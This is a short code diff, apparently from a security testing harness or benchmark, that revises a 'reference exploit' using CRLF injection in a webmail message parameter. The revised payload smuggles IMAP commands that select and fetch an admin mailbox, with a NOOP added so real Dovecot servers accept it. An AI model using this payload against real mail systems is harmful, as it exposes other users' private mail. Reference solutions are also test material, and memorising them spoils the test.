@@ -136,7 +136,11 @@ export const classDef = {
 
   // Reference exploit: CRLF-inject a SELECT of the admin mailbox + FETCH.
   async fireExploit({ baseUrl, scenario }) {
-    const inj = `1 BODY[TEXT]\r\nz1 SELECT ${scenario.adminMailbox}\r\nz2 FETCH 1 BODY[TEXT]`
+    // Trailing NOOP keeps the admin FETCH (z2) a COMPLETE command so real
+    // dovecot returns it; the webmail front's appended " BODY[TEXT]" then lands
+    // harmlessly on the NOOP (a bare "FETCH .. BODY[TEXT] BODY[TEXT]" is a
+    // syntax error in strict IMAP servers).
+    const inj = `1 BODY[TEXT]\r\nz1 SELECT ${scenario.adminMailbox}\r\nz2 FETCH 1 BODY[TEXT]\r\nz3 NOOP`
     const url = `${baseUrl}${scenario.endpoint.path}?${encodeURIComponent(scenario.messageParam)}=${encodeURIComponent(inj)}`
     const r = await fetch(url, { redirect: 'manual' })
     return { status: r.status, body: await r.text() }
